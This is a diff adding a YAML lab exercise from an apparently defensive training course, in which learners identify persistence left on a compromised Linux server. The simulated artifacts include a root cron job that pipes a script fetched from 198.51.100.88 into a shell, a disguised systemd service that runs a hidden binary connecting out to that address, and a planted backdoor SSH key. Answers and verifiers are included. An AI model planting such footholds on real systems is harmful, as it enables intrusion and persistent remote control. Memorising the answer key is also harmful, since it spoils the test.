@@ -1,0 +1,127 @@
+slug: lab-linux-persistence-hunt
+lesson: linux-audit-persistence
+title: Hunt persistence on a compromised Linux server
+pass_mark: 80
+scenario: |
+  The web server **web05** was compromised last week and the intruder's shell was killed, but
+  the CPU keeps spiking and outbound connections to an unfamiliar address continue. Before the
+  server is rebuilt, you need a complete list of what the attacker left behind, so the same
+  footholds can be searched for on the other servers.
+
+  You have the cron jobs for every user, the enabled systemd services, every authorized_keys
+  file, and the auditd records for the watch keys the lesson set up.
+artifacts:
+- name: cron.txt
+  kind: text
+  description: User crontabs and /etc/cron.d.
+  content: |
+    $ for u in $(cut -d: -f1 /etc/passwd); do crontab -l -u $u 2>/dev/null | sed "s/^/$u: /"; done; cat /etc/cron.d/*
+    root: 15 3 * * * /usr/local/bin/backup.sh >/var/log/backup.log 2>&1
+    root: */5 * * * * /usr/bin/curl -fsSL http://198.51.100.88/k.sh | /bin/sh
+    www-data: 0 * * * * /usr/bin/find /var/www/cache -mtime +1 -delete
+    # /etc/cron.d/logrotate
+    0 0 * * * root /usr/sbin/logrotate /etc/logrotate.conf
+- name: systemd.txt
+  kind: text
+  description: Enabled services and the suspicious unit file.
+  content: |
+    $ systemctl list-unit-files --state=enabled --type=service | grep -v '^UNIT'
+    cron.service                 enabled  enabled
+    nginx.service                enabled  enabled
+    ssh.service                  enabled  enabled
+    systemd-journald.service     enabled  enabled
+    dbus-org.freedesktop.helper.service enabled enabled
+
+    $ systemctl cat dbus-org.freedesktop.helper.service
+    # /etc/systemd/system/dbus-org.freedesktop.helper.service
+    [Unit]
+    Description=D-Bus helper
+    After=network.target
+    [Service]
+    ExecStart=/usr/lib/.cache/.dbus-helper -c 198.51.100.88:8443
+    Restart=always
+    [Install]
+    WantedBy=multi-user.target
+- name: authorized_keys.txt
+  kind: text
+  description: Every authorized_keys file.
+  content: |
+    $ for f in /root/.ssh/authorized_keys /home/*/.ssh/authorized_keys; do echo "== $f"; cat "$f"; done
+    == /root/.ssh/authorized_keys
+    ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGk7Q2b ops-jumphost@contoso
+    ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC9x temp@kali
+    == /home/deploy/.ssh/authorized_keys
+    ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIBq1x deploy-ci@contoso
+- name: audit.log
+  kind: log
+  description: auditd records for the sshd_keys, cron and systemd watches.
+  content: |
+    type=SYSCALL msg=audit(1759370112.441:9921): arch=c000003e syscall=257 success=yes exe="/usr/bin/vi" key="sshd_keys" auid=1003 uid=0
+    type=PATH msg=audit(1759370112.441:9921): name="/root/.ssh/authorized_keys" nametype=NORMAL
+    type=SYSCALL msg=audit(1759370140.208:9935): arch=c000003e syscall=257 success=yes exe="/usr/bin/crontab" key="cron" auid=1003 uid=0
+    type=SYSCALL msg=audit(1759370188.902:9950): arch=c000003e syscall=257 success=yes exe="/usr/bin/systemctl" key="systemd" auid=1003 uid=0
+    type=PATH msg=audit(1759370188.902:9950): name="/etc/systemd/system/dbus-org.freedesktop.helper.service" nametype=CREATE
+tasks:
+- prompt: Which IP address does the attacker's cron job download from?
+  type: text
+  accepted:
+  - 198.51.100.88
+  hint: Find a cron job that fetches a script from the internet and pipes it to a shell.
+  explanation: Every five minutes root fetches k.sh from 198.51.100.88 and runs it. Download-and-pipe-to-shell from
+    a bare IP is almost never legitimate.
+  verify:
+    artifact: cron.txt
+    op: set
+    pattern: curl -fsSL http://([\d.]+)/
+- prompt: What is the name of the malicious systemd service?
+  type: text
+  accepted:
+  - dbus-org.freedesktop.helper.service
+  - dbus-org.freedesktop.helper
+  hint: Which enabled service runs a hidden binary that connects out?
+  explanation: dbus-org.freedesktop.helper.service imitates a D-Bus name but runs a hidden file in /usr/lib/.cache
+    and restarts itself forever. Restart=always is why killing the process did not help.
+  verify:
+    artifact: audit.log
+    op: set
+    pattern: name="/etc/systemd/system/([^"]+)" nametype=CREATE
+- prompt: Give the full path of the binary that service runs.
+  type: text
+  accepted:
+  - /usr/lib/.cache/.dbus-helper
+  hint: Read ExecStart.
+  explanation: /usr/lib/.cache/.dbus-helper, a hidden file (leading dot) in a hidden directory. Hash it and search
+    for the hash on other hosts.
+  verify:
+    artifact: systemd.txt
+    op: set
+    pattern: ExecStart=(\S+)
+- prompt: Which SSH key comment identifies the attacker's backdoor key?
+  type: text
+  accepted:
+  - temp@kali
+  hint: Compare the comments at the end of each key line with the organisation's naming.
+  explanation: 'temp@kali in root''s authorized_keys: a key from an attacker''s Kali machine that gives password-free
+    root login. Comments can be faked, so also compare keys against your approved key list.'
+  verify:
+    artifact: authorized_keys.txt
+    op: set
+    pattern: ^ssh-\S+ \S+ (\S+@kali)$
+- prompt: What is the audit user ID (auid) of the account that made all three changes?
+  type: number
+  accepted:
+  - '1003'
+  hint: auid survives sudo and su, so it shows the original login.
+  explanation: auid 1003 made every change even though uid was 0 (root). Map 1003 in /etc/passwd to find the account
+    the attacker logged in with first; that account is how they got in.
+  verify:
+    artifact: audit.log
+    op: set
+    pattern: auid=(\d+)
+- prompt: How many separate persistence mechanisms did the attacker install?
+  type: number
+  accepted:
+  - '3'
+  hint: 'Count each technique once: scheduled job, service, key.'
+  explanation: 'Three: a root cron job, a systemd service and an SSH key. Attackers plant several so one removal
+    does not lock them out, which is why rebuilding from a known-good image is safer than cleaning.'
